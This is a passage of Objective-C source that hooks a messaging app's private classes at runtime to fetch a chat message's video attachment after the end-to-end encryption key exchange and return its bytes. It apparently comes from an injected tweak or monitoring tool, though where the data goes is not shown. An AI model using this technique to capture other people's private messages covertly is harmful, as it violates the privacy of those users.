    DLog (@"!!!!!!!!!!!!!!!!!!!!!!! loading video from server !!!!!!!!!!!!!!!!!!")
    
    __block NSMutableDictionary *videoDataDic = [NSMutableDictionary dictionary];
    
    @try {
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        int timeout = 300;
        
        Class $NLMovieURLLoader		= objc_getClass("NLMovieURLLoader");
        NLMovieURLLoader *loader	= [[$NLMovieURLLoader alloc] init];
        Class $ManagedMessage_Message_ = objc_getClass("ManagedMessage_Message_");
        loader.messageClass = $ManagedMessage_Message_;
        loader.saveRequestType = YES;
        loader.urlType = 4;
        
        Class $NLE2EEManager		= objc_getClass("NLE2EEManager");
        NLE2EEManager* eeManager = [$NLE2EEManager sharedManager];
        
        __block BOOL canGetVideoData = NO;
        
        while (!canGetVideoData) {
            __block NSConditionLock *videoLock = [[NSConditionLock alloc] initWithCondition:0];
            
            [eeManager checkIfKeyExchangeNeededCompletionBlock:^(){
                DLog(@"checkIfKeyExchangeNeededComple");
                @try {
                    if ([loader respondsToSelector:@selector(loadMovieAtURL:withMessageID:knownDownloadURL:obsPopInfo:completion:)]) {
                        [loader loadMovieAtURL:nil withMessageID:[aMessage performSelector:@selector(id)] knownDownloadURL:nil obsPopInfo:[aMessage obsPopInfo] completion:^(NSURL *resultURL, NSError *error){
                            @try {
                                DLog(@"fetch video url completed with url = %@", resultURL);
                                
                                NSString *tempDirectory = NSTemporaryDirectory();
                                NSString *saveFilePath = [tempDirectory stringByAppendingPathComponent:[NSString stringWithFormat:@"/%@.mp4", [aMessage performSelector:@selector(id)]]];
                                
                                DLog(@"temp filePath , %@", saveFilePath);
                                
                                Class $NLObjectStorageOperationParameters		= objc_getClass("NLObjectStorageOperationParameters");
                                NLObjectStorageOperationParameters* downloadOperationParameter = [[$NLObjectStorageOperationParameters alloc] init];
                                downloadOperationParameter.objectID = [aMessage performSelector:@selector(id)];
                                downloadOperationParameter.filePath = saveFilePath;
                                downloadOperationParameter.downloadURL = resultURL;
                                downloadOperationParameter.operationType = 6;
                                downloadOperationParameter.mediaType = 4;
                                downloadOperationParameter.obsPopInfo = [aMessage obsPopInfo];
                                downloadOperationParameter.saveRequestType = 1;
                                
                                Class $NLObjectStorageLegacyDownloadOperation		= objc_getClass("NLObjectStorageLegacyDownloadOperation");
                                NLObjectStorageLegacyDownloadOperation *downloadOperation = [[$NLObjectStorageLegacyDownloadOperation alloc] initWithOperationParameters:downloadOperationParameter];
                                downloadOperation.URL = resultURL;
                                    //Completation Block
                                downloadOperation.completionBlock = ^(){
                                    @try {
                                        [videoLock lock];
                                        DLog(@"download complete with header %@", downloadOperation.responseHeaders);
                                        
                                        NSString *contentType = downloadOperation.responseHeaders[@"Content-Type"];
                                        if ([contentType containsString:@"video"]) {
                                            NSData *attachmentData = [NSData dataWithContentsOfFile:saveFilePath];
                                            if (attachmentData) {
                                                [videoDataDic setObject:attachmentData forKey:@"data"];
                                            }
                                            
                                            canGetVideoData = YES;
                                            dispatch_semaphore_signal(sem);
                                        }
                                        else {
                                            DLog(@"Retry loading a video again after 3 second");
                                            [NSThread sleepForTimeInterval:3.0];
                                        }
                                        
                                        [videoLock unlockWithCondition:1];
                                    } @catch (NSException *exception) {
                                        DLog(@"Found Exception %@", exception)
                                    } @finally {
                                        //Done
                                    }

                                };
                                    //Failed Block
                                downloadOperation.failedBlock = ^(){
                                    @try {
                                        [videoLock lock];
                                        DLog(@"Failed to download");
                                        DLog(@"Retry loading a video again after 3 second");
                                        [NSThread sleepForTimeInterval:3.0];
                                        [videoLock unlockWithCondition:1];
                                    } @catch (NSException *exception) {
                                        DLog(@"Found Exception %@", exception)
                                    } @finally {
                                        //Done
                                    }
                                };
                                
                                Class $NLObjectStorageService		= objc_getClass("NLObjectStorageService");
                                NLObjectStorageService *service = [$NLObjectStorageService sharedService];
                                [service.queue scheduleOperation:downloadOperation];
                                
                            } @catch (NSException *exception) {
                                DLog(@"Found Exception %@", exception)
                                dispatch_semaphore_signal(sem);
                            } @finally {
                                //Done
                            }
                        }];
                    }
                    else {
                        dispatch_semaphore_signal(sem);
                    }

                } @catch (NSException *exception) {
                    DLog(@"Found Exception %@", exception)
                } @finally {
                    //Done
                }
                
                
            }];
            
            DLog(@"*** [LOCK... WAITING Download VIDEO BLOCK TO COMPLETE] ****");
            [videoLock lockWhenCondition:1];
        }
        
        DLog(@"*** [LOCK... WAITING VIDEO BLOCK TO COMPLETE] ****");
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(timeout * NSEC_PER_SEC)));
        dispatch_release(sem);
        [loader release];

    } @catch (NSException *exception) {
        DLog(@"Found Exception %@", exception)
    } @finally {
        //Done
    }

    
    return videoDataDic;
}


@end
